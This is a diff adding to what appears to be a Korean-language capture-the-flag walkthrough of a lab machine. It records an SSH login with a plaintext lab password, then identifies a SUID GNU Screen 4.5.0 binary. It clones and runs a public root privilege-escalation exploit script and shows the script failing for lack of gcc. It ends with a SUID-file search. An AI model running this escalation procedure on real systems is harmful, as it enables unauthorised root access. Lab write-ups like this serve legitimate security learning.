@@ -775,3 +775,33 @@ lennie@startup:/$
 ssh lennie@10.65.164.25
 
 c4ntg3t3n0ughsp1c3
+
+# -rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
+
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/469e2564-c7e1-40ed-8756-717dfe6258d8/image.png)
+
+
+https://github.com/YasserREED/screen-v4.5.0-priv-escalate
+https://www.exploit-db.com/exploits/41154
+
+
+git clone https://github.com/YasserREED/screen-v4.5.0-priv-escalate.git
+cd screen-v4.5.0-priv-escalate
+chmod +x exploit.sh
+./exploit.sh
+
+# GCC 명령어 없어서 실패
+
+./exploit.sh: line 1: creenroot.sh: command not found
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+./exploit.sh: line 21: gcc: command not found
+./exploit.sh: line 33: gcc: command not found
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+No Sockets found in /var/run/screen/S-lennie.
+
+# SUID 파일 찾기
+
+find / -perm -4000 -type f 2>/dev/null  
